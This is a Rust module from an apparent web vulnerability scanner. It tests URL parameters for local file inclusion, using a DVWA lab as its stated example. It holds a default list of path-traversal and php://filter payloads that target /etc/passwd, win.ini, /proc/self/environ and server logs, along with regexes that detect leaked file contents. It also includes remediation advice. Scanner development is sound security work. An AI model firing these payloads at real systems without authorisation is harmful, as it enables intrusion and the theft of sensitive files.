use async_trait::async_trait;
use regex::Regex;
use std::path::{Path, PathBuf};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct LfiScanner {
    payloads_path: PathBuf,
}

impl LfiScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string())
                .filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_lfi_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for LfiScanner {
    fn name(&self) -> &str { "LFI/RFI Scanner" }
    fn description(&self) -> &str { "Tests for Local/Remote File Inclusion vulnerabilities" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();
        let mut tested = std::collections::HashSet::new();

        let lfi_indicators = vec![
            Regex::new(r"root:.*:0:0:").unwrap(),
            Regex::new(r"$$boot loader$$").unwrap(),
            Regex::new(r"$$extensions$$").unwrap(),
            Regex::new(r";\s*for 16-bit app support").unwrap(),
            Regex::new(r"<\?php").unwrap(),
            Regex::new(r"$$mysqld$$").unwrap(),
            Regex::new(r"DocumentRoot").unwrap(),
            Regex::new(r"daemon:.*:.*:").unwrap(),
            Regex::new(r"www-data:.*:.*:").unwrap(),
        ];

        // All params are valid for LFI testing — DVWA uses "page" param
        for page in pages {
            let cookie = page.auth_cookie.clone();

            for (param_name, _) in &page.params {
                let test_key = format!("lfi:{}:{}", page.url, param_name);
                if tested.contains(&test_key) { continue; }

                for payload in &payloads {
                    let test_url = inject_param(&page.url, param_name, payload);

                    let mut req = client.get(&test_url);
                    if let Some(ref c) = cookie { req = req.header("Cookie", c); }

                    if let Ok(resp) = req.send().await {
                        if let Ok(body) = resp.text().await {
                            for indicator in &lfi_indicators {
                                if indicator.is_match(&body) {
                                    tested.insert(test_key.clone());

                                    let severity = if payload.contains("etc/passwd") || payload.contains("win.ini") {
                                        "CRITICAL"
                                    } else {
                                        "HIGH"
                                    };

                                    vulns.push(create_lfi_vuln(
                                        &page.url, param_name, payload,
                                        &format!("File content detected with payload '{}'. Pattern matched: '{}'", payload, indicator.as_str()),
                                        severity,
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                    if tested.contains(&test_key) { break; }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_lfi_vuln(url: &str, param: &str, payload: &str, evidence: &str, severity: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("Local File Inclusion (LFI)", "LFI", severity, url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "Local File Inclusion detected in parameter '{}' using payload '{}'. \
         The server included local file contents in the response.", param, payload
    );
    vuln.impact = "An attacker can read sensitive files (/etc/passwd, config files, source code). \
         May escalate to RCE via log poisoning or PHP wrappers.".to_string();
    vuln.remediation = "1. Never use user input directly in file inclusion functions\n\
         2. Use a whitelist of allowed files\n\
         3. Implement proper input validation\n\
         4. Disable allow_url_include in PHP\n\
         5. Use chroot jails or containerization".to_string();
    vuln.cwe_id = Some("CWE-98".to_string());
    vuln.references = vec![
        "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion".to_string(),
        "https://portswigger.net/web-security/file-path-traversal".to_string(),
    ];
    vuln
}

fn default_lfi_payloads() -> Vec<String> {
    vec![
        "../../../../etc/passwd", "../../../etc/passwd", "../../etc/passwd",
        "../etc/passwd", "/etc/passwd",
        "....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/proc/self/environ", "/var/log/apache2/access.log",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....//....//....//....//etc/passwd",
    ].iter().map(|s| s.to_string()).collect()
}